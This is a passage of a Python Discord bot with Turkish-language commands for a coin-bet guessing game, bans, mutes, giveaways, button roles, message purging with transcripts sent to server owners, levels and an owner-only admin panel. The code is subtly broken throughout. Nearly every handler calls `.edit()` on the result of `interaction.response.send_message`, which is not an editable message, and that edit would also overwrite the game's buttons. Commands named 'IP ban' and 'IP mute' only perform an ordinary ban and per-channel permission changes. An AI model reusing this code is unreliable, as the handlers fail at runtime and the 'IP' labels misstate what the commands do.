            await sent_message.edit(view=TranslateView("Number must be between 1-10!"))
            return
        
        user_coins = bot.coins_data.get(str(interaction.user.id), 0)
        if user_coins < sampy_coin_miktarı:
            sent_message = await interaction.response.send_message("❌ Yeterli Sampy Coin yok!", ephemeral=True)
            await sent_message.edit(view=TranslateView("Not enough Sampy Coin!"))
            return
        
        bot.coins_data[str(interaction.user.id)] = user_coins - sampy_coin_miktarı
        bot.save_json(bot.coins_data, bot.coins_file)
        
        oyun_id = str(random.randint(100000, 999999))
        
        bot.number_games[oyun_id] = {
            "creator": interaction.user.id,
            "target": kullanıcı.id,
            "bet_amount": sampy_coin_miktarı,
            "number": sayı,
            "status": "waiting_accept"
        }
        bot.save_json(bot.number_games, "number_games.json")
        
        embed = discord.Embed(
            title="🎯 Sayı Tahmin Oyunu Daveti!",
            description=f"{kullanıcı.mention}, {interaction.user.mention} size bir sayı tahmin oyunu daveti gönderdi!",
            color=get_rainbow_color()
        )
        embed.add_field(name="Bahis Miktarı", value=f"{sampy_coin_miktarı} Sampy Coin", inline=True)
        embed.add_field(name="Ödül", value=f"{int(sampy_coin_miktarı * 1.8)} Sampy Coin", inline=True)
        embed.add_field(name="Kurallar", value="1-10 arası bir sayı seçildi. Doğru tahmin etmek için!", inline=False)
        
        view = NumberGameView(bot, oyun_id, interaction.user, kullanıcı, sampy_coin_miktarı, sayı)
        sent_message = await interaction.response.send_message(embed=embed, view=view)
        await sent_message.edit(view=TranslateView(f"Number Guessing Game Invite! {kullanıcı.mention}, you've been invited to a game by {interaction.user.mention}"))
    
    elif işlem == "kabul":
        sent_message = await interaction.response.send_message("❌ Kabul işlemi davet üzerinden yapılmalıdır!", ephemeral=True)
        await sent_message.edit(view=TranslateView("Accept action must be done through invite!"))
    
    elif işlem == "reddet":
        sent_message = await interaction.response.send_message("❌ Reddetme işlemi davet üzerinden yapılmalıdır!", ephemeral=True)
        await sent_message.edit(view=TranslateView("Reject action must be done through invite!"))
    
    else:
        sent_message = await interaction.response.send_message("❌ Geçersiz işlem! (gönder/kabul/reddet)", ephemeral=True)
        await sent_message.edit(view=TranslateView("Invalid action! (send/accept/reject)"))

@bot.tree.command(name="ip-ban", description="Kullanıcıyı IP banlar")
@has_command_permission('ban')
async def ipban_tr(
    interaction: discord.Interaction, 
    kullanıcı: discord.Member, 
    süre: Optional[str] = None,
    sebep: Optional[str] = "Sebep belirtilmedi"
):
    if not is_verified(interaction.user, interaction.guild):
        await interaction.response.send_message(get_text(str(interaction.guild.id), "verification_required"), ephemeral=True)
        return
    
    try:
        await kullanıcı.ban(reason=f"IP Ban - {sebep}")
        
        add_punishment(
            str(kullanıcı.id), 
            "ban", 
            interaction.guild.id, 
            sebep, 
            süre, 
            interaction.user.id
        )
        
        embed = discord.Embed(
            title="🔒 IP Ban Uygulandı!",
            description=get_text(str(interaction.guild.id), "banned", user=kullanıcı.mention),
            color=get_rainbow_color()
        )
        embed.add_field(name="Sebep", value=sebep, inline=False)
        
        if süre:
            embed.add_field(name="Süre", value=süre, inline=True)
        
        embed.set_footer(text=f"Eylem: {interaction.user.display_name}")
        sent_message = await interaction.response.send_message(embed=embed)
        await sent_message.edit(view=TranslateView(f"IP Ban Applied to {kullanıcı.mention}. Reason: {sebep}"))
        
        await send_mod_log(
            interaction.guild, 
            "IP Ban", 
            kullanıcı, 
            interaction.user, 
            reason=sebep, 
            duration=süre
        )
        
        if süre:
            süre_saniye = parse_time(süre)
            await asyncio.sleep(süre_saniye)
            await interaction.guild.unban(kullanıcı)
            
    except Exception as e:
        sent_message = await interaction.response.send_message(f"❌ IP Ban başarısız: {str(e)}", ephemeral=True)
        await sent_message.edit(view=TranslateView(f"IP Ban failed: {str(e)}"))

@bot.tree.command(name="ip-sustur", description="Kullanıcıyı IP susturur")
@has_command_permission('mute')
async def ipmute_tr(
    interaction: discord.Interaction, 
    kullanıcı: discord.Member, 
    süre: Optional[str] = None,
    sebep: Optional[str] = "Sebep belirtilmedi"
):
    if not is_verified(interaction.user, interaction.guild):
        await interaction.response.send_message(get_text(str(interaction.guild.id), "verification_required"), ephemeral=True)
        return
    
    try:
        for kanal in interaction.guild.channels:
            if isinstance(kanal, (discord.TextChannel, discord.VoiceChannel)):
                await kanal.set_permissions(kullanıcı, send_messages=False, speak=False)
        
        add_punishment(
            str(kullanıcı.id), 
            "mute", 
            interaction.guild.id, 
            sebep, 
            süre, 
            interaction.user.id
        )
        
        embed = discord.Embed(
            title="🔇 IP Susturma Uygulandı!",
            description=get_text(str(interaction.guild.id), "muted", user=kullanıcı.mention),
            color=get_rainbow_color()
        )
        embed.add_field(name="Sebep", value=sebep, inline=False)
        
        if süre:
            embed.add_field(name="Süre", value=süre, inline=True)
        
        embed.set_footer(text=f"Eylem: {interaction.user.display_name}")
        sent_message = await interaction.response.send_message(embed=embed)
        await sent_message.edit(view=TranslateView(f"IP Mute Applied to {kullanıcı.mention}. Reason: {sebep}"))
        
        await send_mod_log(
            interaction.guild, 
            "IP Susturma", 
            kullanıcı, 
            interaction.user, 
            reason=sebep, 
            duration=süre
        )
        
        if süre:
            süre_saniye = parse_time(süre)
            await asyncio.sleep(süre_saniye)
            for kanal in interaction.guild.channels:
                if isinstance(kanal, (discord.TextChannel, discord.VoiceChannel)):
                    await kanal.set_permissions(kullanıcı, overwrite=None)
                    
    except Exception as e:
        sent_message = await interaction.response.send_message(f"❌ IP Susturma başarısız: {str(e)}", ephemeral=True)
        await sent_message.edit(view=TranslateView(f"IP Mute failed: {str(e)}"))

@bot.tree.command(name="çekiliş-oluştur", description="Çekiliş oluşturur")
@has_command_permission('giveaway')
async def giveaway_create_tr(interaction: discord.Interaction, süre: str, kazanan_sayısı: int, ödül: str, kanal: Optional[discord.TextChannel] = None):
    if not is_verified(interaction.user, interaction.guild):
        await interaction.response.send_message(get_text(str(interaction.guild.id), "verification_required"), ephemeral=True)
        return
    
    try:
        süre_saniye = parse_time(süre)
    except:
        sent_message = await interaction.response.send_message("❌ Geçersiz süre formatı! Örnek: 10s, 5m, 1h, 7d, 2w", ephemeral=True)
        await sent_message.edit(view=TranslateView("Invalid duration format! Example: 10s, 5m, 1h, 7d, 2w"))
        return

    bitiş_zamanı = datetime.datetime.now() + datetime.timedelta(seconds=süre_saniye)
    
    hedef_kanal = kanal or interaction.channel
    
    embed = discord.Embed(
        title="🎉 ÇEKİLİŞ 🎉",
        description=f"**Ödül:** {ödül}\n**Kazanan Sayısı:** {kazanan_sayısı}\n**Bitiş:** <t:{int(bitiş_zamanı.timestamp())}:R> (<t:{int(bitiş_zamanı.timestamp())}:F>)",
        color=get_rainbow_color()
    )
    embed.add_field(name="Katılımcılar", value="0", inline=True)
    embed.set_footer(text=f"Çekiliş: {interaction.user.display_name}")
    
    sent_message = await interaction.response.send_message(f"✅ Çekiliş {hedef_kanal.mention} kanalında oluşturuldu!", ephemeral=True)
    await sent_message.edit(view=TranslateView(f"Giveaway created in {hedef_kanal.mention}!"))
    message = await hedef_kanal.send(embed=embed)
    
    çekiliş_id = str(message.id)
    bot.giveaways_data[çekiliş_id] = {
        "guild_id": interaction.guild.id,
        "channel_id": hedef_kanal.id,
        "end_time": bitiş_zamanı.isoformat(),
        "prize": ödül,
        "winners": kazanan_sayısı,
        "host": interaction.user.id,
        "creator": interaction.user.id,
        "participants": []
    }
    bot.save_json(bot.giveaways_data, bot.giveaways_file)
    
    await message.add_reaction("🎉")

@bot.tree.command(name="çekiliş-bitir", description="Çekilişi erken bitirir")
@has_command_permission('giveaway')
async def giveaway_end_tr(interaction: discord.Interaction, mesaj_id: str):
    if not is_verified(interaction.user, interaction.guild):
        await interaction.response.send_message(get_text(str(interaction.guild.id), "verification_required"), ephemeral=True)
        return
    
    if mesaj_id in bot.giveaways_data:
        await bot.end_giveaway(mesaj_id)
        sent_message = await interaction.response.send_message("✅ Çekiliş bitirildi!", ephemeral=True)
        await sent_message.edit(view=TranslateView("Giveaway ended!"))
    else:
        sent_message = await interaction.response.send_message("❌ Çekiliş bulunamadı!", ephemeral=True)
        await sent_message.edit(view=TranslateView("Giveaway not found!"))

@bot.tree.command(name="çekiliş-tekrar-çek", description="Çekilişi yeniden çeker")
@has_command_permission('giveaway')
async def giveaway_reroll_tr(interaction: discord.Interaction, mesaj_id: str):
    if not is_verified(interaction.user, interaction.guild):
        await interaction.response.send_message(get_text(str(interaction.guild.id), "verification_required"), ephemeral=True)
        return
    
    if mesaj_id not in bot.giveaways_data:
        sent_message = await interaction.response.send_message("❌ Çekiliş bulunamadı!", ephemeral=True)
        await sent_message.edit(view=TranslateView("Giveaway not found!"))
        return

    data = bot.giveaways_data[mesaj_id]
    channel = bot.get_channel(data["channel_id"])
    
    try:
        message = await channel.fetch_message(int(mesaj_id))
        reaction = next((r for r in message.reactions if str(r.emoji) == "🎉"), None)
        
        if not reaction:
            sent_message = await interaction.response.send_message("❌ Bu çekilişte katılım yok!", ephemeral=True)
            await sent_message.edit(view=TranslateView("No participation in this giveaway!"))
            return

        users = [user async for user in reaction.users() if not user.bot]
        
        if len(users) < data["winners"]:
            winners = users
        else:
            winners = random.sample(users, data["winners"])
        
        winners_mention = ", ".join(winner.mention for winner in winners)
        sent_message = await interaction.response.send_message(f"🎉 Yeni kazananlar: {winners_mention}")
        await sent_message.edit(view=TranslateView(f"New winners: {winners_mention}"))
    except:
        sent_message = await interaction.response.send_message("❌ Mesaj bulunamadı!", ephemeral=True)
        await sent_message.edit(view=TranslateView("Message not found!"))

@bot.tree.command(name="kanal-sustur", description="Kanalı susturur")
@has_manage_guild_permission()
async def mutechannel_tr(
    interaction: discord.Interaction, 
    kanal: Optional[discord.TextChannel] = None,
    süre: Optional[str] = None,
    sebep: Optional[str] = "Sebep belirtilmedi"
):
    if not is_verified(interaction.user, interaction.guild):
        await interaction.response.send_message(get_text(str(interaction.guild.id), "verification_required"), ephemeral=True)
        return
    
    if kanal is None:
        kanal = interaction.channel
    
    susturma_süresi = None
    bitiş_zamanı = None
    
    if süre:
        try:
            if süre.endswith('s'):
                susturma_süresi = int(süre[:-1])
            elif süre.endswith('m'):
                susturma_süresi = int(süre[:-1]) * 60
            elif süre.endswith('h'):
                susturma_süresi = int(süre[:-1]) * 3600
            elif süre.endswith('d'):
                susturma_süresi = int(süre[:-1]) * 86400
            else:
                susturma_süresi = int(süre)
        except ValueError:
            sent_message = await interaction.response.send_message("❌ Geçersiz süre formatı! Örnek: 30s, 10m, 2h, 1d", ephemeral=True)
            await sent_message.edit(view=TranslateView("Invalid duration format! Example: 30s, 10m, 2h, 1d"))
            return
        
        bitiş_zamanı = datetime.datetime.now() + datetime.timedelta(seconds=susturma_süresi)
    
    overwrite = kanal.overwrites_for(interaction.guild.default_role)
    overwrite.send_messages = False
    await kanal.set_permissions(interaction.guild.default_role, overwrite=overwrite)
    
    embed = discord.Embed(
        title="🔇 Kanal Susturuldu",
        description=f"{kanal.mention} kanalı susturuldu.",
        color=discord.Color.red()
    )
    
    if susturma_süresi:
        embed.add_field(name="⏰ Süre", value=f"`{süre}`", inline=True)
    
    embed.add_field(name="📝 Sebep", value=sebep, inline=False)
    embed.set_footer(text=f"Eylem: {interaction.user.display_name}")
    
    sent_message = await interaction.response.send_message(embed=embed)
    await sent_message.edit(view=TranslateView(f"Channel {kanal.mention} muted. Reason: {sebep}"))
    
    await send_mod_log(
        interaction.guild, 
        "Kanal Susturma", 
        kanal, 
        interaction.user, 
        reason=sebep, 
        duration=süre
    )
    
    if susturma_süresi:
        await asyncio.sleep(susturma_süresi)
        overwrite.send_messages = None
        await kanal.set_permissions(interaction.guild.default_role, overwrite=overwrite)

@bot.tree.command(name="kanal-susturma-kaldır", description="Kanal susturmasını kaldırır")
@has_manage_guild_permission()
async def unmutechannel_tr(
    interaction: discord.Interaction, 
    kanal: Optional[discord.TextChannel] = None,
    sebep: Optional[str] = "Sebep belirtilmedi"
):
    if not is_verified(interaction.user, interaction.guild):
        await interaction.response.send_message(get_text(str(interaction.guild.id), "verification_required"), ephemeral=True)
        return
    
    if kanal is None:
        kanal = interaction.channel
    
    overwrite = kanal.overwrites_for(interaction.guild.default_role)
    overwrite.send_messages = None
    await kanal.set_permissions(interaction.guild.default_role, overwrite=overwrite)
    
    embed = discord.Embed(
        title="🔊 Kanal Susturması Kaldırıldı",
        description=f"{kanal.mention} kanalı susturması kaldırıldı.",
        color=discord.Color.green()
    )
    embed.add_field(name="📝 Sebep", value=sebep, inline=False)
    embed.set_footer(text=f"Eylem: {interaction.user.display_name}")
    
    sent_message = await interaction.response.send_message(embed=embed)
    await sent_message.edit(view=TranslateView(f"Channel {kanal.mention} unmuted. Reason: {sebep}"))
    
    await send_mod_log(
        interaction.guild, 
        "Kanal Susturma Kaldırma", 
        kanal, 
        interaction.user, 
        reason=sebep
    )

@bot.tree.command(name="buton-rol-sistemi-kurulum", description="Buton rol sistemini kurar")
@has_command_permission('button-role-system-setup')
async def button_role_system_tr(
    interaction: discord.Interaction, 
    rol_ismi: str, 
    renk: Optional[str] = "varsayılan"
):
    if not is_verified(interaction.user, interaction.guild):
        await interaction.response.send_message(get_text(str(interaction.guild.id), "verification_required"), ephemeral=True)
        return
    
    RENK_MAP = {
        "kırmızı": discord.Color.red(),
        "yeşil": discord.Color.green(),
        "mavi": discord.Color.blue(),
        "sarı": discord.Color.gold(),
        "mor": discord.Color.purple(),
        "turuncu": discord.Color.orange(),
        "pembe": discord.Color.magenta(),
        "varsayılan": discord.Color.default()
    }
    
    if renk.startswith("#") and len(renk) == 7:
        try:
            renk_değeri = discord.Color(int(renk[1:], 16))
        except:
            renk_değeri = discord.Color.default()
    else:
        renk_değeri = RENK_MAP.get(renk.lower(), discord.Color.default())
    
    rol = discord.utils.get(interaction.guild.roles, name=rol_ismi)
    if not rol:
        try:
            rol = await interaction.guild.create_role(
                name=rol_ismi, 
                color=renk_değeri, 
                mentionable=True,
                reason=f"Buton rol sistemi - {interaction.user}"
            )
        except discord.Forbidden:
            sent_message = await interaction.response.send_message("❌ Rol oluşturma iznim yok!", ephemeral=True)
            await sent_message.edit(view=TranslateView("I don't have permission to create roles!"))
            return
    
    embed = discord.Embed(
        title="🎯 Buton Rol Sistemi",
        description=f"Aşağıdaki butona tıklayarak **{rol_ismi}** rolünü alın/kaldırın!",
        color=renk_değeri
    )
    
    view = RoleButtonView(rol.id)
    sent_message = await interaction.response.send_message(embed=embed, view=view)
    await sent_message.edit(view=TranslateView(f"Button Role System - Click to get/remove {rol_ismi} role"))
    
    bot.button_roles_data[str(interaction.channel_id)] = rol.id
    bot.save_json(bot.button_roles_data, bot.button_roles_file)

@bot.tree.command(name="temizle", description="Mesajları temizler (en fazla 1000 veya tümü)")
@is_bot_owner()
async def clear_tr(interaction: discord.Interaction, miktar: str, sebep: Optional[str] = "Sebep belirtilmedi"):
    if not is_verified(interaction.user, interaction.guild):
        await interaction.response.send_message(get_text(str(interaction.guild.id), "verification_required"), ephemeral=True)
        return
    
    await interaction.response.defer(ephemeral=True)
    
    try:
        temizle_id = str(random.randint(1000000000, 9999999999))
        
        if miktar.lower() == "tümü":
            deleted = await interaction.channel.purge(limit=1000)
            mesaj_sayısı = len(deleted)
        else:
            miktar_sayı = int(miktar)
            if miktar_sayı > 1000:
                sent_message = await interaction.followup.send("❌ En fazla 1000 mesaj silebilirsiniz!", ephemeral=True)
                await sent_message.edit(view=TranslateView("You can only delete up to 1000 messages!"))
                return
            deleted = await interaction.channel.purge(limit=miktar_sayı)
            mesaj_sayısı = len(deleted)
        
        transcript_content = f"Silinen Mesajlar Transkripti - ID: {temizle_id}\n"
        transcript_content += f"Tarih: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        transcript_content += f"Kanal: #{interaction.channel.name}\n"
        transcript_content += f"Silinen Mesaj Sayısı: {mesaj_sayısı}\n"
        transcript_content += f"Sebep: {sebep}\n"
        transcript_content += f"Eylem: {interaction.user} ({interaction.user.id})\n"
        transcript_content += "="*50 + "\n\n"
        
        for i, message in enumerate(deleted, 1):
            transcript_content += f"{i}. [{message.created_at.strftime('%H:%M:%S')}] {message.author}: {message.content}\n"
            if message.attachments:
                transcript_content += f"   📎 Ekler: {', '.join([att.url for att in message.attachments])}\n"
            transcript_content += "\n"
        
        transcript_file = discord.File(
            io.BytesIO(transcript_content.encode('utf-8')),
            filename=f"transcript_{temizle_id}.txt"
        )
        
        try:
            guild_owner = interaction.guild.owner
            if guild_owner:
                embed = discord.Embed(
                    title="🗑️ Mesaj Temizleme Logu",
                    description=f"Mesajlar **{interaction.user.mention}** tarafından temizlendi",
                    color=get_rainbow_color(),
                    timestamp=datetime.datetime.now()
                )
                embed.add_field(name="Kanal", value=interaction.channel.mention, inline=True)
                embed.add_field(name="Silinen Mesajlar", value=f"{mesaj_sayısı} adet", inline=True)
                embed.add_field(name="Tür", value="Tüm mesajlar" if miktar.lower() == "tümü" else f"{miktar} mesaj", inline=True)
                embed.add_field(name="Sebep", value=sebep, inline=False)
                embed.add_field(name="ID", value=f"`{temizle_id}`", inline=True)
                
                sent_message = await guild_owner.send(embed=embed, file=transcript_file)
                await sent_message.edit(view=TranslateView(f"Message Clear Log: {mesaj_sayısı} messages cleared in {interaction.channel.mention} by {interaction.user}"))
        except Exception as e:
            print(f"Sunucu sahibine log gönderilemedi: {e}")
        
        if str(interaction.guild.id) not in bot.message_logs_data:
            bot.message_logs_data[str(interaction.guild.id)] = {}
        
        bot.message_logs_data[str(interaction.guild.id)][temizle_id] = {
            "type": "clear",
            "channel_id": interaction.channel.id,
            "channel_name": interaction.channel.name,
            "moderator": str(interaction.user),
            "moderator_id": interaction.user.id,
            "message_count": mesaj_sayısı,
            "reason": sebep,
            "timestamp": datetime.datetime.now().isoformat(),
            "transcript": transcript_content[:2000] + "..." if len(transcript_content) > 2000 else transcript_content
        }
        bot.save_json(bot.message_logs_data, bot.message_logs_file)
        
        sent_message = await interaction.followup.send(
            f"✅ **{mesaj_sayısı}** mesaj silindi! {'(Tüm mesajlar temizlendi)' if miktar.lower() == 'tümü' else ''}\n"
            f"**ID:** `{temizle_id}`\n"
            f"**Sebep:** {sebep}",
            ephemeral=True
        )
        await sent_message.edit(view=TranslateView(f"**{mesaj_sayısı}** messages deleted! ID: `{temizle_id}`"))
        
    except ValueError:
        sent_message = await interaction.followup.send("❌ Geçersiz miktar! Sayı veya 'tümü' girin.", ephemeral=True)
        await sent_message.edit(view=TranslateView("Invalid amount! Enter a number or 'all'."))
    except Exception as e:
        sent_message = await interaction.followup.send(f"❌ Silme başarısız: {str(e)}", ephemeral=True)
        await sent_message.edit(view=TranslateView(f"Delete failed: {str(e)}"))

@bot.tree.command(name="silinen-mesajlar-listesi", description="Silinen mesajların listesini gösterir")
async def deleted_messages_list_tr(interaction: discord.Interaction, mesaj_silme_id: str):
    if not is_verified(interaction.user, interaction.guild):
        await interaction.response.send_message(get_text(str(interaction.guild.id), "verification_required"), ephemeral=True)
        return
    
    if not (is_bot_owner()(interaction) or interaction.user == interaction.guild.owner):
        sent_message = await interaction.response.send_message(get_text(str(interaction.guild.id), "no_permission"), ephemeral=True)
        await sent_message.edit(view=TranslateView("You don't have permission to use this!"))
        return
    
    guild_id = str(interaction.guild.id)
    
    if guild_id not in bot.message_logs_data or mesaj_silme_id not in bot.message_logs_data[guild_id]:
        sent_message = await interaction.response.send_message("❌ Bu ID ile silme kaydı bulunamadı!", ephemeral=True)
        await sent_message.edit(view=TranslateView("No delete record found with that ID!"))
        return
    
    clear_data = bot.message_logs_data[guild_id][mesaj_silme_id]
    
    embed = discord.Embed(
        title=f"🗑️ Silinen Mesajlar - ID: {mesaj_silme_id}",
        color=get_rainbow_color(),
        timestamp=datetime.datetime.fromisoformat(clear_data["timestamp"])
    )
    
    embed.add_field(name="Kanal", value=f"<#{clear_data['channel_id']}> ({clear_data['channel_name']})", inline=True)
    embed.add_field(name="Silinen Mesajlar", value=clear_data["message_count"], inline=True)
    embed.add_field(name="Moderatör", value=clear_data["moderator"], inline=True)
    embed.add_field(name="Sebep", value=clear_data["reason"], inline=False)
    
    if "transcript" in clear_data:
        transcript_file = discord.File(
            io.BytesIO(clear_data["transcript"].encode('utf-8')),
            filename=f"transcript_{mesaj_silme_id}.txt"
        )
        sent_message = await interaction.response.send_message(embed=embed, file=transcript_file, ephemeral=True)
        await sent_message.edit(view=TranslateView(f"Deleted Messages - ID: {mesaj_silme_id}. {clear_data['message_count']} messages deleted."))
    else:
        sent_message = await interaction.response.send_message(embed=embed, ephemeral=True)
        await sent_message.edit(view=TranslateView(f"Deleted Messages - ID: {mesaj_silme_id}. {clear_data['message_count']} messages deleted."))

@bot.tree.command(name="admin-paneli", description="Bot yönetim paneli (sadece bot sahibi)")
@is_bot_owner()
async def admin_panel_tr(interaction: discord.Interaction):
    if not is_verified(interaction.user, interaction.guild):
        await interaction.response.send_message(get_text(str(interaction.guild.id), "verification_required"), ephemeral=True)
        return
    
    embed = discord.Embed(
        title="🛠️ Admin Paneli",
        description="Aşağıdaki butonlarla botu yönetin:",
        color=get_rainbow_color()
    )
    embed.add_field(name="🔴 Botu Kapat", value="Botu tamamen kapatır", inline=True)
    embed.add_field(name="📋 Sunucuları Listele", value="Botun bulunduğu sunucuları gösterir", inline=True)
    embed.add_field(name="📊 Bot Durumu", value="Bot istatistiklerini gösterir", inline=True)
    embed.add_field(name="🔗 Davet Oluştur", value="Sunucular için davet linkleri oluşturur", inline=True)
    embed.add_field(name="👑 Admin Rollerini Yönet", value="Sunucular için admin rollerini yönetir", inline=True)
    embed.add_field(name="👋 Sunucudan Ayrıl", value="Seçilen sunucudan ayrılır", inline=True)
    
    view = AdvancedAdminPanelView(bot)
    sent_message = await interaction.response.send_message(embed=embed, view=view, ephemeral=True)
    await sent_message.edit(view=TranslateView("Admin Panel - Manage the bot with the buttons below:"))

@bot.tree.command(name="giriş-çıkış-kanal-ayarla", description="Katılma/ayrılma bildirim kanalını ayarlar")
@is_server_owner()
async def input_output_channel_set_tr(interaction: discord.Interaction, kanal: Optional[discord.TextChannel] = None):
    if not is_verified(interaction.user, interaction.guild):
        await interaction.response.send_message(get_text(str(interaction.guild.id), "verification_required"), ephemeral=True)
        return
    
    guild_id = str(interaction.guild.id)
    
    if kanal:
        bot.io_channels[guild_id] = kanal.id
        sent_message = await interaction.response.send_message(
            get_text(guild_id, "io_channel_set", channel=kanal.mention),
            ephemeral=True
        )
        await sent_message.edit(view=TranslateView(f"IO channel set to {kanal.mention}"))
    else:
        if guild_id in bot.io_channels:
            del bot.io_channels[guild_id]
            sent_message = await interaction.response.send_message(
                "✅ Giriş-çıkış kanalı temizlendi (varsayılan sistem kanalı kullanılacak)",
                ephemeral=True
            )
            await sent_message.edit(view=TranslateView("IO channel cleared (using default system channel)"))
        else:
            sent_message = await interaction.response.send_message(
                "❌ Bu sunucu için giriş-çıkış kanalı ayarlanmamış!",
                ephemeral=True
            )
            await sent_message.edit(view=TranslateView("No IO channel set for this server!"))
    
    bot.save_json(bot.io_channels, bot.io_channels_file)

@bot.tree.command(name="dil-ayarla", description="Bot dilini değiştirir (sadece sunucu sahibi)")
@is_server_owner()
async def setlang_tr(interaction: discord.Interaction):
    if not is_verified(interaction.user, interaction.guild):
        await interaction.response.send_message(get_text(str(interaction.guild.id), "verification_required"), ephemeral=True)
        return
    
    view = LanguageView(bot, str(interaction.guild.id))
    sent_message = await interaction.response.send_message(
        "🌐 **Dil Ayarları**\nTercih ettiğiniz dili seçin:",
        view=view,
        ephemeral=True
    )
    await sent_message.edit(view=TranslateView("Language Settings - Select your preferred language:"))

@bot.tree.command(name="seviye", description="Sizin veya başka bir kullanıcının seviyesini kontrol eder")
async def level_tr(interaction: discord.Interaction, kullanıcı: Optional[discord.Member] = None):
    if not is_verified(interaction.user, interaction.guild):
        await interaction.response.send_message(get_text(str(interaction.guild.id), "verification_required"), ephemeral=True)
        return
    
    hedef = kullanıcı or interaction.user
    guild_id = str(interaction.guild.id)
    user_id = str(hedef.id)
    
    if guild_id in bot.level_data and user_id in bot.level_data[guild_id]:
        data = bot.level_data[guild_id][user_id]
        mesajlar = data["messages"]
        seviye = data["level"]
        sent_message = await interaction.response.send_message(
            get_text(guild_id, "level", user=hedef.mention, level=seviye, messages=mesajlar)
        )
        await sent_message.edit(view=TranslateView(f"{hedef.mention} - Level: {seviye} | Messages: {mesajlar}"))
    else:
        sent_message = await interaction.response.send_message(
            f"{hedef.mention} henüz mesaj göndermemiş!",
            ephemeral=True
        )
        await sent_message.edit(view=TranslateView(f"{hedef.mention} has no messages yet!"))

@bot.tree.command(name="seviye-sıralaması", description="Seviyeye göre ilk 10 kullanıcıyı gösterir")
async def leveltop_tr(interaction: discord.Interaction):
    if not is_verified(interaction.user, interaction.guild):
        await interaction.response.send_message(get_text(str(interaction.guild.id), "verification_required"), ephemeral=True)
        return
    
    guild_id = str(interaction.guild.id)
    
    if guild_id not in bot.level_data or not bot.level_data[guild_id]:
        sent_message = await interaction.response.send_message("Bu sunucu için henüz seviye verisi yok!")
        await sent_message.edit(view=TranslateView("No level data for this server yet!"))
        return

    kullanıcılar = []
    for user_id, data in bot.level_data[guild_id].items():
        user = interaction.guild.get_member(int(user_id))
        if user:
            kullanıcılar.append((user, data["level"], data["messages"]))

    kullanıcılar.sort(key=lambda x: x[1], reverse=True)
    ilk10 = kullanıcılar[:10]

    embed = discord.Embed(
        title=get_text(guild_id, "level_top"),
        color=get_rainbow_color()
    )
    
    for i, (user, seviye, mesajlar) in enumerate(ilk10, 1):
        embed.add_field(
            name=f"{i}. {user.display_name}", 
            value=f"Seviye: {seviye} | Mesaj: {mesajlar}", 
            inline=False
        )

    sent_message = await interaction.response.send_message(embed=embed)
    await sent_message.edit(view=TranslateView("Level Top 10 - Shows top 10 users by level"))

@bot.tree.command(name="at", description="Kullanıcıyı sunucudan atar")
@has_command_permission('kick')
async def kick_tr(interaction: discord.Interaction, kullanıcı: discord.Member, sebep: Optional[str] = "Sebep belirtilmedi"):
    if not is_verified(interaction.user, interaction.guild):
        await interaction.response.send_message(get_text(str(interaction.guild.id), "verification_required"), ephemeral=True)
        return
    
    try:
        await kullanıcı.kick(reason=sebep)
        
        add_punishment(
            str(kullanıcı.id), 
            "kick", 
            interaction.guild.id, 
            sebep, 
            None, 
            interaction.user.id
        )
        
        sent_message = await interaction.response.send_message(
            get_text(str(interaction.guild.id), "kicked", user=kullanıcı.mention)
        )
        await sent_message.edit(view=TranslateView(f"Kicked {kullanıcı.mention}"))
        
        await send_mod_log(
            interaction.guild, 
            "Atma", 
            kullanıcı, 
            interaction.user, 
            reason=sebep
        )
    except Exception as e:
        sent_message = await interaction.response.send_message(f"❌ Atma başarısız: {str(e)}", ephemeral=True)
        await sent_message.edit(view=TranslateView(f"Kick failed: {str(e)}"))

@bot.tree.command(name="yasakla", description="Kullanıcıyı sunucudan yasaklar")
@has_command_permission('ban')
async def ban_tr(
    interaction: discord.Interaction, 
    kullanıcı: discord.Member, 
    süre: Optional[str] = None,
    sebep: Optional[str] = "Sebep belirtilmedi"
):
    if not is_verified(interaction.user, interaction.guild):
        await interaction.response.send_message(get_text(str(interaction.guild.id), "verification_required"), ephemeral=True)
        return
    
    try:
        await kullanıcı.ban(reason=sebep)
        
        add_punishment(
            str(kullanıcı.id), 
            "ban", 
            interaction.guild.id, 
            sebep, 
            süre, 
            interaction.user.id
        )
        
        embed = discord.Embed(
            title="🔨 Yasaklama Uygulandı!",
            description=get_text(str(interaction.guild.id), "banned", user=kullanıcı.mention),
            color=get_rainbow_color()
        )
        embed.add_field(name="Sebep", value=sebep, inline=False)
        
        if süre:
            embed.add_field(name="Süre", value=süre, inline=True)
        
        embed.set_footer(text=f"Eylem: {interaction.user.display_name}")
        sent_message = await interaction.response.send_message(embed=embed)
        await sent_message.edit(view=TranslateView(f"Banned {kullanıcı.mention}. Reason: {sebep}"))
        
        await send_mod_log(
            interaction.guild, 
            "Yasaklama", 
            kullanıcı, 
            interaction.user, 
            reason=sebep, 
            duration=süre
        )
        
        if süre:
            süre_saniye = parse_time(süre)
            await asyncio.sleep(süre_saniye)
            await interaction.guild.unban(kullanıcı)
            
    except Exception as e:
        sent_message = await interaction.response.send_message(f"❌ Yasaklama başarısız: {str(e)}", ephemeral=True)
        await sent_message.edit(view=TranslateView(f"Ban failed: {str(e)}"))

@bot.tree.command(name="yasak-kaldır", description="Kullanıcının yasağını kaldırır")
@has_command_permission('ban')
async def unban_tr(interaction: discord.Interaction, kullanıcı_id: str, sebep: Optional[str] = "Sebep belirtilmedi"):
    if not is_verified(interaction.user, interaction.guild):
        await interaction.response.send_message(get_text(str(interaction.guild.id), "verification_required"), ephemeral=True)
        return
    
    try:
        user = await bot.fetch_user(int(kullanıcı_id))
        await interaction.guild.unban(user, reason=sebep)
        
        if kullanıcı_id in bot.punishment_users:
            for ceza_id, ceza_verisi in list(bot.punishment_users[kullanıcı_id].items()):
                if ceza_verisi['type'] == 'ban' and ceza_verisi['guild_id'] == interaction.guild.id:
                    del bot.punishment_users[kullanıcı_id][ceza_id]
                    if not bot.punishment_users[kullanıcı_id]:
                        del bot.punishment_users[kullanıcı_id]
                    bot.save_json(bot.punishment_users, bot.punishment_users_file)
                    break
        
        sent_message = await interaction.response.send_message(
            get_text(str(interaction.guild.id), "unbanned", user=user.mention)
        )
        await sent_message.edit(view=TranslateView(f"Unbanned {user.mention}"))
        
        await send_mod_log(
            interaction.guild, 
            "Yasak Kaldırma", 
            user, 
            interaction.user, 
            reason=sebep
        )
    except Exception as e:
        sent_message = await interaction.response.send_message(f"❌ Yasak kaldırma başarısız: {str(e)}", ephemeral=True)
        await sent_message.edit(view=TranslateView(f"Unban failed: {str(e)}"))

